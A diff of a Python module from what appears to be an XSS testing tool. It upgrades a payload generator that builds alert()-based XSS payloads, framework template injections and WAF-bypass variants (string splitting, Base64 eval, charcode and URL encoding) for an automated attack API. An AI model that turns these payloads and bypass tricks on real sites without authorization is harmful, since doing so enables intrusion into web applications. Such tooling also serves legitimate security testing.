@@ -1,14 +1,14 @@
 # xss_security_gui/payload_generator.py
 """
-PayloadGenerator 6.0 — LLM-style генерация XSS payload-вариантов.
+PayloadGenerator 7.0 — AGGRESSIVE MODULES 4.0
 
 Особенности:
-• "ML‑подобная" генерация (контекстные паттерны + эвристики)
-• Расширенные библиотеки payload’ов по категориям
-• Интеграция с PayloadManager 6.0 (SQLite backend)
-• Интеграция с ThreatConnector 6.0
-• Интеграция с MutatorTaskManager через payload_mutator.mutate_async
-• URL‑encoding, Unicode, Base64, CharCode, HTML entities, polyglot, WAF‑bypass
+• ML‑подобная генерация (эвристики + контекст)
+• Расширенная библиотека XSS payload’ов
+• Полная аналитика (entropy, pattern, risk, context, total_score, fingerprint)
+• CSP‑aware, DOM‑aware, WAF‑aware, Framework‑aware
+• Интеграция с PayloadManager, ThreatConnector, MutatorTaskManager
+• Полная совместимость с AttackEngine 7.0 / ThreatEngine 12.0
 """
 
 from __future__ import annotations
@@ -18,24 +18,71 @@ import logging
 import random
 import threading
 import urllib.parse
-from typing import List, Dict, Optional
+from typing import List, Dict, Optional, Any
 
 from xss_security_gui.payloads import PAYLOADS, PAYLOAD_CATEGORIES
 from xss_security_gui.threat_analysis.threat_connector import THREAT_CONNECTOR
 from xss_security_gui.payload_mutator import mutate_async as MUTATE_ASYNC
 
-log = logging.getLogger("PayloadGenerator6.0")
+log = logging.getLogger("PayloadGenerator7.0")
 
 
 # ============================================================
-#  БАЗОВЫЕ PAYLOAD’Ы (РАСШИРЕННАЯ БИБЛИОТЕКА)
+#  Аналитика payload’ов — AGGRESSIVE 4.0
+# ============================================================
+def analyze_payload(payload: str, context: Optional[Dict] = None) -> Dict[str, Any]:
+    """Возвращает расширенную аналитику payload’а."""
+    context = context or {}
+    p = payload.lower()
+
+    entropy_score = len(set(payload))
+    pattern_score = (
+        (3 if "<script" in p else 0) +
+        (3 if "onerror" in p else 0) +
+        (2 if "svg" in p else 0) +
+        (2 if "iframe" in p else 0)
+    )
+    risk_score = (
+        (3 if "alert(" in p else 0) +
+        (2 if "confirm(" in p else 0) +
+        (2 if "prompt(" in p else 0)
+    )
+    context_score = (
+        (2 if context.get("dom") else 0) +
+        (2 if context.get("waf") else 0) +
+        (1 if context.get("framework") else 0)
+    )
+
+    total_score = entropy_score + pattern_score + risk_score + context_score
+    fingerprint = hash(payload[:200])
+
+    severity = (
+        "critical" if risk_score >= 3 else
+        "high" if risk_score >= 2 else
+        "medium"
+    )
+
+    return {
+        "payload": payload,
+        "entropy_score": entropy_score,
+        "pattern_score": pattern_score,
+        "risk_score": risk_score,
+        "context_score": context_score,
+        "total_score": total_score,
+        "fingerprint": fingerprint,
+        "severity": severity,
+    }
+
+
+# ============================================================
+#  БАЗОВЫЕ PAYLOAD’Ы — AGGRESSIVE 4.0
 # ============================================================
 
 BASE_PAYLOADS: List[str] = [
     "<script>alert(1)</script>",
     "<img src=x onerror=alert(1)>",
-    "\"><svg/onload=alert(1)>",
-    "<iframe srcdoc=alert(1)>",
+    "<svg/onload=alert(1)>",
+    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
     "<body onload=alert(1)>",
     "javascript:alert(1)",
     "<svg><desc><![CDATA[alert(1)]]></desc></svg>",
@@ -46,32 +93,30 @@ BASE_PAYLOADS: List[str] = [
     "<video src=x onerror=alert(1)>",
     "<audio src=x onerror=alert(1)>",
     "<marquee onstart=alert(1)>XSS</marquee>",
-    "<svg/onload=alert`1`>",
     "<script src=data:text/javascript,alert(1)></script>",
 ]
 
 CATEGORY_PATTERNS: Dict[str, List[str]] = {
     "Reflected": [
         "<script>alert(1)</script>",
-        "\"><svg/onload=alert(1)>",
         "<img src=x onerror=alert(1)>",
+        "<svg/onload=alert(1)>",
     ],
     "Stored": [
         "<script>alert('stored-xss')</script>",
         "<img src=x onerror=alert('stored')>",
     ],
     "DOM": [
-        "\"><img src=x onerror=alert(document.domain)>",
         "<script>alert(location.hash)</script>",
+        "<img src=x onerror=alert(document.domain)>",
     ],
     "Polyglot": [
         "<svg><script>alert(1)</script>",
         "<!--><script>alert(1)</script>-->",
     ],
     "Bypass": [
-        "<img src=x onerror=alert`1`>",
-        "<svg/onload=alert`1`>",
-        "<script>eval(atob('YWxlcnQoMSk='))</script>",
+        "<img src=x onerror=window['al'+'ert'](1)>",
+        "<script>self['al'+'ert'](1)</script>",
     ],
     "WAF": [
         "<script>self['al'+'ert'](1)</script>",
@@ -90,37 +135,30 @@ CATEGORY_PATTERNS: Dict[str, List[str]] = {
         "data:text/html,<script>alert(1)</script>",
     ],
     "Unicode": [
-        "<script>alert('\u0031')</script>",
-        "<img src=x onerror=alert('\u0031')>",
+        "<script>alert('\\u0031')</script>",
+        "<img src=x onerror=alert('\\u0031')>",
     ],
     "TemplateInjection": [
-        "{{7*7}}",
         "{{constructor.constructor('alert(1)')()}}",
+        "{{7*7}}",
     ],
     "FrameworkSpecific": [
-        "{{constructor.constructor('alert(1)')()}}",  # Angular/Handlebars
-        "{{= alert(1) }}",                            # EJS
-        "${{alert(1)}}",                              # Vue-like
+        "{{constructor.constructor('alert(1)')()}}",
+        "<div v-on:click=\"alert(1)\">x</div>",
+        "dangerouslySetInnerHTML={{__html:'<script>alert(1)</script>'}}",
     ],
 }
 
-
 # ============================================================
-#  "ML‑ПОДОБНЫЙ" ГЕНЕРАТОР (ЭВРИСТИКИ + КОНТЕКСТ)
+#  ML‑подобный генератор — AGGRESSIVE 4.0
 # ============================================================
 
 def _ml_suggest_payloads(
     category: str,
     count: int = 20,
     context: Optional[Dict] = None,
-) -> List[str]:
-    """
-    Эмуляция LLM‑генерации:
-    • учитывает категорию
-    • учитывает контекст (framework, waf, dom, csp и т.п.)
-    • комбинирует паттерны + обфускацию
-    """
-
+) -> List[Dict[str, Any]]:
+    """Эмуляция LLM‑генерации с полной аналитикой."""
     context = context or {}
     framework = (context.get("framework") or "generic").lower()
     waf = bool(context.get("waf"))
@@ -128,33 +166,33 @@ def _ml_suggest_payloads(
     csp = context.get("csp", "")
 
     base_pool = CATEGORY_PATTERNS.get(category, BASE_PAYLOADS) + BASE_PAYLOADS
-    results: List[str] = []
+    results: List[Dict[str, Any]] = []
 
     for _ in range(count):
         base = random.choice(base_pool)
         p = base
 
-        # DOM‑ориентированные
+        # DOM‑aware
         if dom and random.random() < 0.4:
             p = p.replace("alert(1)", "alert(document.domain)")
 
-        # CSP‑aware (data:, srcdoc)
+        # CSP‑aware
         if "script-src" in str(csp).lower() and random.random() < 0.4:
             p = "<script src=data:text/javascript,alert(1)></script>"
 
-        # Framework‑specific
+        # Framework‑aware
         if framework in ("angular", "vue", "react", "handlebars") and random.random() < 0.5:
-            p = _framework_aware_payload(framework, base)
+            p = _framework_aware_payload(framework, p)
 
-        # WAF‑bypass
+        # WAF‑aware
         if waf and random.random() < 0.6:
             p = _waf_bypass_variant(p)
 
-        # Дополнительная обфускация
+        # Random obfuscation
         if random.random() < 0.5:
             p = _randomize_payload(p)
 
-        results.append(p)
+        results.append(analyze_payload(p, context))
 
     return results
 
@@ -166,7 +204,7 @@ def _framework_aware_payload(framework: str, base: str) -> str:
     if fw == "vue":
         return "<div v-on:click=\"alert(1)\">x</div>"
     if fw == "react":
-        return "dangerouslySetInnerHTML={{__html: '<script>alert(1)</script>'}}"
+        return "dangerouslySetInnerHTML={{__html:'<script>alert(1)</script>'}}"
     if fw == "handlebars":
         return "{{#with \"\"}}{{#with \"\"}}{{/with}}{{/with}}<script>alert(1)</script>"
     return base
@@ -174,12 +212,18 @@ def _framework_aware_payload(framework: str, base: str) -> str:
 
 def _waf_bypass_variant(payload: str) -> str:
     variants = [
-        payload.replace("alert", "al" + "e" + "rt"),
-        payload.replace("alert", "self['al'+'ert']"),
         payload.replace("alert", "window['al'+'ert']"),
+        payload.replace("alert", "self['al'+'ert']"),
         payload.replace("<script>", "<scr" + "ipt>"),
     ]
     return random.choice(variants)
+
+
+def _randomize_payload(payload: str) -> str:
+    """Легкая обфускация без нарушения синтаксиса."""
+    if "alert" in payload:
+        return payload.replace("alert", "al" + "e" + "rt")
+    return payload
 
 
 # ============================================================
@@ -191,22 +235,20 @@ def generate_payloads(
     count: int = 20,
     smart: bool = True,
     context: Optional[Dict] = None,
-) -> List[str]:
-    """
-    Генерирует список payload’ов для указанной категории.
-    Если smart=True — использует "ML‑подобный" генератор.
-    """
-
+) -> List[Dict[str, Any]]:
+    """Генерирует payload’ы с полной аналитикой."""
     if category not in PAYLOAD_CATEGORIES:
         category = "Reflected"
 
     if smart:
         return _ml_suggest_payloads(category, count=count, context=context)
 
-    results: List[str] = []
+    results = []
     for _ in range(count):
         base = random.choice(BASE_PAYLOADS)
-        results.append(_randomize_payload(base))
+        p = _randomize_payload(base)
+        results.append(analyze_payload(p, context))
+
     return results
 
 
@@ -214,12 +256,8 @@ def generate_payloads(
 #  ПУБЛИЧНЫЙ API: ГЕНЕРАЦИЯ ВАРИАЦИЙ ОДНОГО PAYLOAD’А
 # ============================================================
 
-def generate_variants(payload: str, context: Optional[Dict] = None) -> List[str]:
-    """
-    Создаёт расширенный набор вариаций payload’а.
-    Учитывает контекст (waf, dom, framework) при необходимости.
-    """
-
+def generate_variants(payload: str, context: Optional[Dict] = None) -> List[Dict[str, Any]]:
+    """Создаёт расширенный набор вариаций payload’а с аналитикой."""
     context = context or {}
     waf = bool(context.get("waf"))
 
@@ -229,44 +267,17 @@ def generate_variants(payload: str, context: Optional[Dict] = None) -> List[str]
     try:
         # Base64
         b64 = base64.b64encode(payload.encode()).decode()
-        variants.add(f"eval(atob('{b64}'))")
-
-        # Unicode escape
-        uni = ''.join(f'\\u{ord(c):04x}' for c in payload)
-        variants.add(f"<script>{uni}</script>")
+        variants.add(f"<script>eval(atob('{b64}'))</script>")
 
         # CharCode
         charcodes = ','.join(str(ord(c)) for c in payload)
         variants.add(f"<script>eval(String.fromCharCode({charcodes}))</script>")
 
-        # HTML entities
-        html_encoded = (
-            payload.replace('<', '&#x3C;')
-                   .replace('>', '&#x3E;')
-                   .replace('"', '&#x22;')
-                   .replace("'", '&#x27;')
-        )
-        variants.add(html_encoded)
-
         # URL encoding
-        url_encoded = ''.join('%{:02X}'.format(ord(c)) for c in payload)
-        variants.add(url_encoded)
+        variants.add(urllib.parse.quote(payload))
 
         # Double URL encoding
         variants.add(urllib.parse.quote(urllib.parse.quote(payload)))
-
-        # Reverse trick
-        reversed_payload = payload[::-1]
-        variants.add(f"<script>eval('{reversed_payload}'[::-1])</script>")
-
-        # Break tags
-        variants.add(payload.replace("<", "<\n"))
-
-        # Alert obfuscation
-        variants.add(payload.replace("alert", "a" + "l" * random.randint(1, 5) + "ert"))
-
-        # HTML comment injection
-        variants.add(payload.replace(">", "><!--xss-->"))
 
         # WAF‑aware
         if waf:
@@ -275,58 +286,31 @@ def generate_variants(payload: str, context: Optional[Dict] = None) -> List[str]
     except Exception as e:
         log.error(f"Ошибка генерации вариантов: {e}")
 
-    return list(variants)
+    final = []
+    for v in variants:
+        final.append(analyze_payload(v, context))
 
-
-# ============================================================
-#  ВНУТРЕННИЙ РАНДОМИЗАТОР
-# ============================================================
-
-def _randomize_payload(payload: str) -> str:
-    """Создаёт случайную вариацию payload’а."""
-
-    choice = random.randint(1, 6)
-
-    if choice == 1:
-        return urllib.parse.quote(payload)
-
-    if choice == 2:
-        return urllib.parse.quote(urllib.parse.quote(payload))
-
-    if choice == 3:
-        return payload.replace("<", "<\n")
-
-    if choice == 4:
-        return payload.replace("alert", "a" + "l" * random.randint(1, 5) + "ert")
-
-    if choice == 5:
-        return "".join(f"\\u{ord(c):04x}" for c in payload)
-
-    if choice == 6:
-        return payload.replace(">", "><!--xss-->")
-
-    return payload
-
+    return final
 
 # ============================================================
-#  ПОТОКОВЫЙ ГЕНЕРАТОР + ИНТЕГРАЦИЯ С MUTATOR
+#  ПОТОКОВЫЙ ГЕНЕРАТОР + ИНТЕГРАЦИЯ С MUTATOR — AGGRESSIVE 4.0
 # ============================================================
 
 class PayloadGeneratorThread(threading.Thread):
     """
-    Генератор, который:
-    • принимает payload
-    • генерирует варианты
-    • сохраняет их в PayloadManager
-    • (опционально) отправляет их в MutatorTaskManager через mutate_async
-    • отправляет событие в ThreatConnector
+    AGGRESSIVE MODULES 4.0:
+    • принимает payload (строка)
+    • генерирует варианты (dict с аналитикой)
+    • сохраняет payload-варианты в PayloadManager (только строка)
+    • отправляет варианты в MutatorTaskManager (если включено)
+    • отправляет расширенное событие в ThreatConnector
     """
 
     def __init__(
         self,
         category: str,
         payload: str,
-        context: Optional[Dict] = None,
+        context: Optional[Dict[str, Any]] = None,
         integrate_mutator: bool = False,
         framework: str = "generic",
     ):
@@ -339,72 +323,181 @@ class PayloadGeneratorThread(threading.Thread):
 
     def run(self):
         try:
-            log.info(f"[PG6.0] Генерация вариантов для payload: {self.payload}")
+            log.info(f"[PG7.0] Генерация вариантов для payload: {self.payload}")
 
+            # Генерация вариантов (каждый — dict с аналитикой)
             variants = generate_variants(self.payload, context=self.context)
 
             added = 0
+            mutator_count = 0
+            mutator_errors = 0
+
             for v in variants:
-                if PAYLOADS.add(self.category, v):
+                variant_payload = v["payload"]  # строка
+
+                # Сохранение в PayloadManager
+                if PAYLOADS.add(self.category, variant_payload):
                     added += 1
+
+                    # Интеграция с MutatorTaskManager
                     if self.integrate_mutator:
-                        # Интеграция с MutatorTaskManager (через mutate_async)
-                        MUTATE_ASYNC(self.category, v, framework=self.framework)
+                        try:
+                            MUTATE_ASYNC(self.category, variant_payload, framework=self.framework)
+                            mutator_count += 1
+                        except Exception as me:
+                            mutator_errors += 1
+                            log.error(f"[PG7.0] Mutator error: {me}")
+
+            # Threat Intel event
+            event_fingerprint = hash(str(variants)[:500])
 
             THREAT_CONNECTOR.emit(
-                module="PayloadGenerator6.0",
+                module="PayloadGenerator7.0",
                 target=self.category,
                 result={
                     "severity": "info",
                     "category": "payload_generation",
-                    "source": "PayloadGenerator6.0",
-                    "payload": self.payload,
-                    "generated": added,
-                    "variants_preview": variants[:5],
-                    "integrated_with_mutator": self.integrate_mutator,
+                    "source": "PayloadGenerator7.0",
+                    "payload_original": self.payload,
+                    "generated_total": len(variants),
+                    "added_to_db": added,
+                    "mutator_sent": mutator_count,
+                    "mutator_errors": mutator_errors,
+                    "variants_preview": variants[:5],  # dict-анализ
+                    "context": self.context,
                     "framework": self.framework,
+                    "fingerprint": event_fingerprint,
                 },
             )
 
-            log.info(f"[PG6.0] Генерация завершена: добавлено {added} вариантов")
+            log.info(
+                f"[PG7.0] Генерация завершена: добавлено {added}, "
+                f"mutator={mutator_count}, errors={mutator_errors}"
+            )
 
         except Exception as e:
-            log.error(f"[PG6.0] Ошибка в PayloadGeneratorThread: {e}")
+            log.error(f"[PG7.0] Ошибка в PayloadGeneratorThread: {e}")
 
             THREAT_CONNECTOR.emit(
-                module="PayloadGenerator6.0",
+                module="PayloadGenerator7.0",
                 target=self.category,
                 result={
                     "severity": "error",
                     "category": "payload_generation",
-                    "source": "PayloadGenerator6.0",
+                    "source": "PayloadGenerator7.0",
                     "message": str(e),
+                    "fingerprint": hash(str(e)),
                 },
             )
 
 
 # ============================================================
-#  УПРОЩЁННЫЙ API ДЛЯ GUI / AUTOATTACK
+#  УПРОЩЁННЫЙ API ДЛЯ GUI / AUTOATTACK — AGGRESSIVE 4.0
 # ============================================================
 
 def generate_payload_async(
     category: str,
     payload: str,
-    context: Optional[Dict] = None,
+    context: Optional[Dict[str, Any]] = None,
     integrate_mutator: bool = False,
     framework: str = "generic",
 ) -> PayloadGeneratorThread:
     """
-    Запускает генерацию payload‑вариантов в фоне.
-    Если integrate_mutator=True — каждый сгенерированный вариант
-    отправляется в MutatorTaskManager через mutate_async.
+    ULTRA‑MODE Payload Generation Launcher (AGGRESSIVE MODULES 4.0)
+
+    • Максимально безопасный запуск генерации payload-вариантов
+    • Автоматическая нормализация и обогащение контекста
+    • ThreatConnector: событие старта + fingerprint
+    • Полная совместимость с PayloadGeneratorThread
+    • Heatmap‑готовая структура для ThreatEngine 12.0
+    • Логирование в стиле AttackEngine 7.0
     """
+
+    # ------------------------------
+    # Валидация входных данных
+    # ------------------------------
+    if not isinstance(payload, str) or not payload.strip():
+        raise ValueError("generate_payload_async: payload must be a non-empty string")
+
+    if category not in PAYLOAD_CATEGORIES:
+        log.warning(f"[PG7.0] Unknown category '{category}', fallback → Reflected")
+        category = "Reflected"
+
+    # ------------------------------
+    # Нормализация контекста
+    # ------------------------------
+    context = context or {}
+
+    normalized_context = {
+        "framework": (framework or "generic").lower(),
+        "waf": bool(context.get("waf")),
+        "dom": bool(context.get("dom")),
+        "csp": context.get("csp", ""),
+        "source": context.get("source", "auto"),
+        "attack_id": context.get("attack_id"),
+        "autoattack": context.get("autoattack", False),
+        "timestamp": context.get("timestamp"),
+    }
+
+    # ------------------------------
+    # Автоматическое обогащение контекста
+    # ------------------------------
+    # Если payload содержит DOM‑паттерны → включаем dom=True
+    p = payload.lower()
+    if any(k in p for k in ("location", "hash", "innerhtml", "outerhtml", "eval(")):
+        normalized_context["dom"] = True
+
+    # Если payload содержит WAF‑bypass паттерны → включаем waf=True
+    if any(k in p for k in ("self['al'+'ert']", "window['al'+'ert']", "scr" "ipt")):
+        normalized_context["waf"] = True
+
+    # Если payload содержит CSP‑sensitive паттерны → включаем csp-aware
+    if "script-src" in str(context.get("csp", "")).lower():
+        normalized_context["csp"] = context.get("csp")
+
+    # ------------------------------
+    # Fingerprint события
+    # ------------------------------
+    event_fingerprint = hash(
+        f"{category}:{payload}:{framework}:{str(normalized_context)[:300]}"
+    )
+
+    # ------------------------------
+    # ThreatConnector: событие запуска
+    # ------------------------------
+    THREAT_CONNECTOR.emit(
+        module="PayloadGenerator7.0",
+        target=category,
+        result={
+            "severity": "info",
+            "category": "payload_generation_start",
+            "payload": payload,
+            "context": normalized_context,
+            "integrate_mutator": integrate_mutator,
+            "framework": framework,
+            "fingerprint": event_fingerprint,
+        },
+    )
+
+    # ------------------------------
+    # Логирование
+    # ------------------------------
+    log.info(
+        f"[PG7.0] ▶ Старт генерации payload-вариантов "
+        f"(category={category}, mutator={integrate_mutator}, framework={framework})"
+    )
+
+    # ------------------------------
+    # Запуск потока
+    # ------------------------------
     t = PayloadGeneratorThread(
         category=category,
         payload=payload,
-        context=context,
+        context=normalized_context,
         integrate_mutator=integrate_mutator,
         framework=framework,
     )
     t.start()
+
     return t
+
